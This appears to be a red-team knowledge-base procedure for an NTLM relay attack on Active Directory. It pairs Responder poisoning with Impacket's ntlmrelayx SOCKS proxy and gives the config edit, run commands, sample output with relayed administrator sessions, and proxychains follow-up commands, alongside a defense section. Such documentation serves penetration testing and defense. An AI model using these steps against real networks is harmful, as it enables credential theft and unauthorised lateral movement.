---
type: procedure
description: >-
  A Man-in-the-Middle attack that uses Responder to intercept NTLM
  authentication and Impacket's ntlmrelayx to relay it to target systems,
  enabling credential access and further exploitation via SOCKS proxy.
verified: true
submitted: false
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
  - >-
    [[techniques/Signed Script Proxy Execution|T1216 - Signed Script Proxy
    Execution]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
  - '[[tags/SMB Signing Disabled and IPv4]]'
commands:
  - '[[commands/disable-smb-http-in-responder-config]]'
  - '[[commands/run-ntlmrelayx-socks-proxy]]'
tools:
  - '[[tools/Responder]]'
  - '[[tools/Impacket]]'
platforms:
  - Windows
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Perform-NTLM-Relay-Attack-with-Responder-and-Impacket

## Summary

This procedure outlines a Man-in-the-Middle (MitM) attack leveraging Responder to poison LLMNR/NBT-NS queries and capture NTLM hashes, combined with Impacket's ntlmrelayx to relay those authentications to target systems. By disabling Responder's own SMB and HTTP servers, the attack avoids self-poisoning and focuses on relaying to external targets, ultimately providing a SOCKS proxy for post-exploitation access to compromised sessions.

## Description

In Active Directory environments where SMB signing is disabled, attackers can perform NTLM relay attacks by intercepting authentication attempts (e.g., via LLMNR/NBT-NS poisoning) and relaying them to other services on the network. Responder acts as the poisoning tool to capture NTLM challenges, while ntlmrelayx handles the relay to protocols like SMB, MSSQL, HTTP, LDAP, etc. The SOCKS proxy feature allows chaining other tools (e.g., Impacket clients or CrackMapExec) through the relayed sessions for lateral movement, credential dumping, or execution. This technique is effective in IPv4 networks with weak name resolution security and can lead to domain admin access if relayed to high-privilege services. Prerequisites include network adjacency to the target and tools installed on a Linux attacker machine (e.g., Kali).

## Requirements

1. Responder tool installed and configured for LLMNR/NBT-NS poisoning.
2. Impacket suite installed, including ntlmrelayx.
3. Network access to broadcast domain or routed segments where targets perform name resolutions.
4. SMB signing disabled on target systems (verifiable via group policy or registry checks).
5. IPv4 connectivity; targets file listing vulnerable hosts (e.g., /tmp/targets.txt with IPs or hostnames).
6. Proxychains or similar for routing tools through the SOCKS proxy.

## Defense

- Enable SMB signing enforced via Group Policy (Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network client: Digitally sign communications (always)).
- Disable LLMNR (via Group Policy: Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution) and enable DNSSEC.
- Implement EPA (Extended Protection for Authentication) for LDAP and other services.
- Monitor for anomalous NTLM authentications (Event ID 4624 with NTLM type) and unusual SOCKS traffic.
- Use network segmentation and IPsec to encrypt traffic.
- Deploy multi-factor authentication (MFA) to invalidate stolen hashes.

## Objectives

1. Intercept NTLM authentication attempts via poisoning to capture hashes.
2. Relay captured authentications to target services for unauthorized access.
3. Establish SOCKS proxy for persistent access and lateral movement using relayed credentials.
4. Achieve execution or data exfiltration on target systems without direct logon.

## Instructions

### Step 1: Disable SMB and HTTP Servers in Responder Configuration

**Context**: To prevent Responder from responding to its own poisoning attempts (self-DoS), disable its built-in SMB and HTTP servers in the configuration file. This ensures Responder only poisons and listens without serving fake responses that could interfere with relaying.

**Code** ([[codes/Responder-Config-Disable-SMB-HTTP]]):

Edit the Responder.conf file (typically /etc/responder/Responder.conf or ./Responder.conf) and modify the [Responder Core] section as follows:

```ini
[Responder Core]
; Servers to start
...
SMB = Off     # Turn this off
HTTP = Off    # Turn this off
```

> Save the file and restart Responder if running. This step is crucial for clean relay operations, as enabled servers could cause loops or expose the attacker.

**Expected Output**: No visible output; verify by checking the config file contents or running Responder in verbose mode to confirm servers are off.

### Step 2: Run NTLMRelayX as SOCKS Proxy for Relaying

**Context**: Launch ntlmrelayx to listen for relayed NTLM authentications from Responder and forward them to specified targets. The -socks option creates a dynamic SOCKS proxy (default port 1080) for each compromised session, enabling proxied access to services like SMB shares or MSSQL databases using the relayed credentials.

**Command** ([[commands/run-ntlmrelayx-socks-proxy]]):

```bash
impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
```

> This starts the relay servers. Once connections are captured (e.g., from Responder poisoning), use the interactive 'socks' command to list available proxies. Select targets with -t for specific protocols if needed. Then, chain tools like proxychains with Impacket or CrackMapExec to exploit via the proxy.

**Expected Output**:

```
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> socks
Protocol  Target          Username                  Port
--------  --------------  ------------------------  ----
MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
```

If a relay succeeds, you'll see authentication success and proxy details. For example, using the proxy:

```bash
proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"
```

**Success Indicators**:
- Responder captures NTLM hashes without self-interference.
- ntlmrelayx lists active SOCKS proxies with usernames and protocols.
- Proxied connections (e.g., smbclient) authenticate successfully using relayed creds.
